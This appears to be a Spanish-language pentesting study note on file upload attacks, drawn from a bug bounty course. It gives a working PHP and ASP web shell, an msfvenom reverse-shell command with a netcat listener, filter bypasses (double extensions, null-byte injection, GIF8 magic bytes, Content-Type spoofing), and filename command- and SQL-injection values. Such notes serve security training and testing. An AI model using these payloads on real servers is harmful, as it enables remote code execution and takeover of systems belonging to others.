---
title: File Upload Attacks (web shell + filter bypass)
slug: file-upload-attacks
category: techniques
updated: 2026-08-20
summary: "Subir web/reverse shell vía upload: bypass client-side, blacklist (.phtml/fuzz ext), whitelist (doble ext shell.php.jpg, char injection %00), Content-Type + magic bytes GIF8"
tags: [web, file-upload, rce, web-shell, reverse-shell, filter-bypass, php]
sensitive: false
---

# File Upload Attacks

## When to use
Funcionalidad de subida (avatar, adjuntos) que guarda el archivo en una ruta
web-accesible y el server ejecuta su lenguaje → subir web/reverse shell = RCE.
Ver hub [[web-app-attacks]].

## Payloads (web shell / reverse shell)
```php
// PHP web shell mínima → /uploads/shell.php?cmd=id  (ver source con Ctrl+U)
<?php system($_REQUEST['cmd']); ?>
```
```asp
<% eval request('cmd') %>          <!-- .NET/ASP -->
```
- Web shells listas: [phpbash](https://github.com/Arrexel/phpbash), SecLists `/Web-Shells/`.
- Reverse shell: [pentestmonkey php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) (editar IP/PORT líneas 49-50) + `nc -lvnp PORT`.
- Generar: `msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > reverse.php`.
- Reverse > web shell (más interactiva) pero puede fallar (firewall egress / funciones deshabilitadas) → fallback web shell.

## Bypass client-side (solo JS front-end)
La app nunca hace request al seleccionar → validación en el navegador. Dos vías:
1. **Interceptar en Burp**: subir imagen normal → cambiar `filename="x.png"` → `shell.php` y el contenido por la shell.
2. **Editar el front-end**: DevTools `CTRL+SHIFT+C` → borrar `onchange="checkFile(this)"` y/o `accept=".jpg,..."` del `<input type=file>`. Cambio temporal, basta para subir.

## Bypass blacklist de extensiones (back-end)
Blacklist `['php','php7','phps']` es incompleta.
```bash
# Fuzz de extensiones con Burp Intruder (posición en la ext, quitar URL-encode del punto)
# Wordlists: PayloadsAllTheThings/Extension PHP/extensions.lst ; SecLists web-extensions.txt
```
- Extensiones que suelen ejecutar PHP: **`.phtml`**, `.phar`, `.php3/4/5/7`, `.pht`.
- Windows case-insensitive → `pHp` puede saltar blacklist case-sensitive.

## Bypass whitelist de extensiones
Regex débil `'^.*\.(jpg|jpeg|png|gif)'` (sin `$`) solo verifica que *contenga* la ext:
- **Doble extensión**: `shell.jpg.php` (termina en .php, contiene .jpg).
- **Doble extensión inversa**: `shell.php.jpg` — funciona si Apache `<FilesMatch "\.ph(ar|p|tml)">` no cierra con `$` (misconfig: ejecuta PHP por *contener* .php).
- **Character injection** (server viejo/misconfig): inyectar antes/después de la ext:
  `%20 %0a %00 %0d0a / .\ . … :` → `shell.php%00.jpg` (PHP ≤5.X trunca en %00 → `shell.php`), Windows `shell.aspx:.jpg`.
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\' '.' ':'; do for ext in '.php' '.phps'; do
  echo "shell$char$ext.jpg"; echo "shell$ext$char.jpg"; echo "shell.jpg$char$ext"; done; done > wl.txt
```

## Bypass filtros de contenido
- **Content-Type header** (client-side): interceptar y cambiar el `Content-Type` del *adjunto* (hay 2 headers: request + archivo) a `image/jpg`. Fuzz con SecLists `web-all-content-types.txt | grep image/`.
- **MIME / magic bytes** (server lee primeros bytes): prepender `GIF8` al inicio del archivo → `file` lo ve como GIF, manteniendo extensión `.php`:
```bash
echo "GIF8" > shell.php ; # luego el <?php ... ?> debajo. `file shell.php` → GIF image data
```
Combinar: MIME permitido + Content-Type no permitido + extensión no permitida, etc. — permutar para confundir el filtro.

## Otros ataques de upload
- **Filename injection**: `file$(whoami).jpg`, `` file`whoami`.jpg ``, `file.jpg||whoami` (si la app usa el nombre en un comando SO → RCE). También XSS (`<script>...</script>.jpg`) o SQLi (`file';select sleep(5);--.jpg`) en el nombre.
- **Disclosure del directorio de upload**: fuzz; forzar errores (nombre duplicado, 2 requests simultáneas, nombre de 5000 chars); LFI/XXE para leer el source.
- **Windows**: chars reservados (`| < > * ?`), nombres reservados (`CON COM1 LPT1 NUL`), 8.3 (`WEB~1.CON` sobreescribe `web.conf`) → errores/DoS/overwrite.
- **Avanzado**: procesamiento automático (encode video, zip, resize) explotable — ej. AVI→XXE en ffmpeg.

## Gotchas
- No toda extensión ejecuta en toda config: probar varias.
- Subir una shell a producción = RCE persistente → borrar el artefacto subido y documentar (cleanup obligatorio, ver [[scope]]).

## References
- Relacionado: [[web-app-attacks]], [[command-injection]], [[reverse-shells]], [[xss]], [[web-app-fundamentals]]
- PayloadsAllTheThings/Upload Insecure Files. Curso CWES Bug Bounty → 03-WEB → "File Upload Attacks" (HTB Academy). Notion.
